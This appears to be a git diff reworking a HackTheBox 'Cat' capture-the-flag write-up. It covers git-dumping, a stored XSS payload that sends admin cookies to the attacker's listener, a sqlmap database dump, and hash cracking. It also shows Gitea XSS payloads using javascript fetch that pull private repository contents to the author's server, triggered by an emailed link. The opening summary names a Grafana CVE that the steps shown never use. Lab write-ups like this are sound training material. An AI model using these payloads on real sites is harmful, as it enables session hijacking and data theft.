@@ -1,48 +1,91 @@
-Port Scanning
+#  HackTheBox: Cat - Writeup
+This medium-difficulty box involves discovering a vulnerable Grafana v11.0.0 subdomain and exploiting CVE-2024-9264 for initial access. After pivoting to the user enzo, an internal cronjob web app running as root is accessed via SSH tunneling. Abusing this app allows privilege escalation to root. The box combines web enumeration, real-world CVE usage, and creative privesc via scheduled tasks.
+
+##  Enumeration
+
+### Nmap Scan
+
 Using nmap, we are able to identify any open ports. The following ports are open;
 •	SSH (22)
 •	Apache Web Server (80)
-Nmap –sCV 10.10.11.53
- 
+```bash
+nmap –sCV 10.10.11.53
+ ```
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image002.png)
+
 From the scripts scan, we can see a .git repository on the web server. Further enumeration using gobuster has been conducted but had no clear results. So now, we must add the machine’s IP to the hosts file in your machine.
 
  
-Initial foothold
-Using git-dumper, we able to extract the files in the .git directory of the web server.
-Git-dumper http://cat.htb/.bit gitFolder
+## Initial foothold
 
+### Git Enumeration
+Using git-dumper, we able to extract the files in the .git directory of the web server.
+
+```bash
+git-dumper http://cat.htb/.bit gitFolder
+```
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image004.png)
  
 We then explore some of the interesting files gained.
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image006.png)
  
 On the join.php file, there is no input sanitization for the username, possible XSS. Hmm interesting..
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image006.png)
  
 On the contest.php, the data of the users is sent to the SQL database. Including the username, which could be malicious.
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image007.png)
  
 On the admin.php, the admin (axel) either accepts or rejects the cat.
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image009.png)
  
 The accept_cat.php is susceptible to SQLi, where the sql_insert statement is being used.
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image011.png)
  
 On the config.php some information about the SQL database and configuration is given.
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image013.png)
  
 Using all this information from the file, we can construct an attack procedure.
 
+### Persitent XSS 
+
 First, we can create a user with the XSS payload in the username field, to gain admin cookies.
+
+```bash
 <script>document.location='http://10.10.14.120:1111/?c='+document.cookie;</script>
- 
+```
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image014.png)
+
 Then register a normal cat in the contest.
- 
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image014.png)
+
 From here, when admin accepts the cat, we gain his cookies.
- 
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image016.png)
+
 Which we use, to hijack his session.
- 
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image018.png)
+
 We are able to gain access to the admin.php, demonstrating successful XSS attack, now to get information from the SQL db, since we have the admin cookie.
  
+## Exploitation
 
-
- 
 Since accept_cat.php is vulnerable to SQLi, we use the data provided from it, catID and catName to form a sqlmap comand.
-sqlmap -u "http://cat.htb/accept_cat.php" --data="catId=1&catName=a" --cookie="PHPSESSID=ikn31got0uppvf5h3n5snv6cqh" -p "catName" --dbms=SQLite --dump --level=5 --risk=3 --flush-session --threads=5 --hex
 
+```bash
+sqlmap -u "http://cat.htb/accept_cat.php" --data="catId=1&catName=a" --cookie="PHPSESSID=ikn31got0uppvf5h3n5snv6cqh" -p "catName" --dbms=SQLite --dump --level=5 --risk=3 --flush-session --threads=5 --hex
+```
+
+![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Cat/Screenshots/image020.png)
  
 During the process, we are able to gain some usernames and hashed passwords, these are noted down. Some of the users include; rosa, axel(admin), robert, and more..
 
@@ -53,6 +96,8 @@ The hashes identified are md5 hashes.
 Using johntheripper, we are able to obtain the hashed credentials, note only user rosa has a correct hash, rest of the users do not.
  
 Using the credentials, we are able to SSH into rosa’s user.
+
+## Privelege Escalation
  
 Using linPEAS, we are aiming to privilege escalate or find some information.
  
@@ -68,6 +113,8 @@ Using SSH tunnelling on port 3000.
  
 We are able to login into the gitea, using axel’s credentials.
  We see this web server is powered by gitea version 1.22.0. Which is, vulnerable to Persistent XSS.
+
+## Post-Exploitation
  
 Using that information, I formed a XSS that accesses the employee-management readme and sends to my python server, accessing that information.
 <a href="javascript:
@@ -81,7 +128,8 @@ The link of the git is then sent to jobert, as instructed in the mail.
 echo "http://localhost:3000/axel/test/" | sendmail jobert@localhost
  
 The obtained data is then decoded from base64, getting the following information;
-# Employee Management
+
+Employee Management
 Site under construction. Authorized user: admin. No visibility or updates visible to employees.
 In order to get the contents of the git, the following script is formed.
 <a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/')
